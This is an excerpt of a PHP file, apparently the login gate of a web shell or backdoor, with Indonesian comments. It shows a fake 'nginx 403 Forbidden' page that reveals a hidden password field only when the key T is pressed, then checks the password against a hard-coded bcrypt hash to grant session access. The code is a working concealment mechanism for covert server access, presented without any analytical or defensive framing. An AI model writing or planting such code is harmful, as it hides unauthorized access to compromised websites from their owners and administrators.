...
?>
    ...
    <head>
        ...
        document.addEventListener("DOMContentLoaded", function() {
            ...
            // Hotkey T/t untuk munculkan form password
            document.addEventListener("keydown", function(event) {
                if ((event.key === "T" || event.key === "t") && !formAppended) {
                    showPasswordForm();
                }
            });
            function showPasswordForm() {
                if (formAppended) return;
                formAppended = true;
                // Buat form via JS
                var container = document.createElement('div');
                container.className = 'pw-form-container';
                container.innerHTML = `
                    <form id="password-form" method="post" autocomplete="off">
                        <input type="password" class="pw-input" name="pass" placeholder=" Password" autocomplete="off">
                    </form>
                `;
                document.body.appendChild(container);
                var pwInput = container.querySelector('.pw-input');
                pwInput.focus();
                // ENTER = submit
    ...
    <body>
        <h1>403 Forbidden</h1>
        <hr>
        <div class="footer">nginx/1.25.5</div>
        <!-- Form password akan muncul via JS hanya setelah tekan T/t -->
    </body>
    </html>
<?php
    exit;
...
if (!isset($_SESSION['authenticated'])) {
    $stored_hashed_password = '$2y$12$e5Gb1mNZmCUGho7z7WUzUuCWXVrNoS20CABaDbbUjAUwbm9m0iRgC'; // Use PASSWORD_DEFAULT hash

    if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
        $_SESSION['authenticated'] = true;
    } elseif (isset($_POST['pass'])) {
        // Jika salah, kembali ke halaman forbidden tanpa form login (tekan T/t ulang jika mau coba lagi)
        show_login_page();
    } else {
        show_login_page();
    }
